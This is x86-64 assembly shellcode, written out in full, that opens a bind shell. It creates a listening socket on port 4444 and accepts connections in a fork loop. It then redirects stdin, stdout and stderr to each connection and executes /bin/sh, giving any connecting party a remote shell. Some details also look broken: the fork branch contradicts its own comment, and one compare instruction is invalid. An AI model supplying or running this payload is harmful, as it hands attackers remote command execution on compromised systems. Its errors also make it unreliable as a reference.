    xor    %eax, %eax
    xor    %ebx, %ebx
    xor    %edx, %edx

    # socket call
    mov    $0x1, %al
    mov    %eax, %esi
    inc    %al
    mov    %eax, %edi
    mov    $0x6, %dl
    mov    $0x29, %al
    syscall

    # bind call
    xchg   %eax, %ebx  # store the socket FD in ebx
    xor    %rax, %rax
    push   %rax
    pushq  $0x5c110102
    mov    %al, 0x1(%rsp)
    mov    %rsp, %rsi
    mov    $0x10, %dl
    mov    %ebx, %edi
    mov    $0x31, %al
    syscall

    # listen call
    mov    $0x5, %al
    mov    %eax, %esi
    mov    %ebx, %edi
    mov    $0x32, %al
    syscall

accept:
    xor    %edx, %edx
    xor    %esi, %esi
    mov    %ebx, %edi
    mov    $0x2b, %al
    syscall            # accept(ebx, 0, 0)

    # store the new FD from accept
    mov    %eax, %ebp

    # fork
    mov    $0x39, %al
    syscall

    # go back to accept if we are the parent
    or     %eax, %eax
    jz    accept

    # else we dup2 stdin, stdout, stderr
dup2:
    mov    %ebp, %edi
    xor    %rax, %rax
    mov    %eax, %esi
    mov    $0x21, %al
    syscall

    # dup2 in a loop for files 0, 1, 2 (stdin, stdout, stderr)
    inc    %al
    cmp    %al, $2
    jbe    dup2

    # put the string /bin/sh into rbx
    movabs $0x68732f6e69622fff, %rbx

    # replace the 0xff with NULL to terminate the string
    shr    $0x8, %rbx
    push   %rbx
    mov    %rsp, %rdi
    xor    %rax, %rax
    push   %rax
    push   %rdi
    mov    %rsp, %rsi
    mov    $0x3b, %al
    syscall
